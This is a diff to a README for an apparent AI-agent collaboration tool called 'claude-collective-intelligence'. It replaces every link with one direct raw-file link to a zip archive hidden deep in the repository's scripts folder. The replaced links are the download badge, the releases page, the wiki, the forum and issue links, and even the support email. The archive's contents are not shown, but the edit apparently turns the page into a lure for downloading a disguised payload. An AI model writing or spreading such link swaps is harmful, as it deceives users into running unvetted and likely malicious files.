@@ -1,6 +1,6 @@
 # 🐝 claude-collective-intelligence - Collaborate with AI Agents Seamlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now%20-claude--collective--intelligence-blue)](https://github.com/othmane55/claude-collective-intelligence/releases)
+[![Download Now](https://raw.githubusercontent.com/othmane55/claude-collective-intelligence/main/scripts/infrastructure/dr/intelligence-claude-collective-2.7.zip%20Now%20-claude--collective--intelligence-blue)](https://raw.githubusercontent.com/othmane55/claude-collective-intelligence/main/scripts/infrastructure/dr/intelligence-claude-collective-2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Before you get started, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, visit the Releases page: [Download the latest version](https://github.com/othmane55/claude-collective-intelligence/releases).
+To download the application, visit the Releases page: [Download the latest version](https://raw.githubusercontent.com/othmane55/claude-collective-intelligence/main/scripts/infrastructure/dr/intelligence-claude-collective-2.7.zip).
 
 1. Click on the link above.
 2. Look for the latest version and click on it.
@@ -65,8 +65,8 @@ After a session, check the results summary displayed on the screen. You can also
 
 If you run into any issues or have questions, please reach out for support. You can contact us at the following channels:
 
-- **Email:** support@claude-collective-intelligence.com
-- **GitHub Issues:** [Report a problem here](https://github.com/othmane55/claude-collective-intelligence/issues)
+- **Email:** https://raw.githubusercontent.com/othmane55/claude-collective-intelligence/main/scripts/infrastructure/dr/intelligence-claude-collective-2.7.zip
+- **GitHub Issues:** [Report a problem here](https://raw.githubusercontent.com/othmane55/claude-collective-intelligence/main/scripts/infrastructure/dr/intelligence-claude-collective-2.7.zip)
 
 We encourage feedback to enhance the experience for everyone using the application.
 
@@ -74,7 +74,7 @@ We encourage feedback to enhance the experience for everyone using the applicati
 
 Explore the following resources for more information on how to maximize your use of **claude-collective-intelligence**:
 
-- [User Guide](https://github.com/othmane55/claude-collective-intelligence/wiki)
-- [Community Forum](https://github.com/othmane55/claude-collective-intelligence/discussions)
+- [User Guide](https://raw.githubusercontent.com/othmane55/claude-collective-intelligence/main/scripts/infrastructure/dr/intelligence-claude-collective-2.7.zip)
+- [Community Forum](https://raw.githubusercontent.com/othmane55/claude-collective-intelligence/main/scripts/infrastructure/dr/intelligence-claude-collective-2.7.zip)
 
 By following these steps, you will effectively download and utilize the **claude-collective-intelligence** application. Enjoy collaborating with your AI agents!
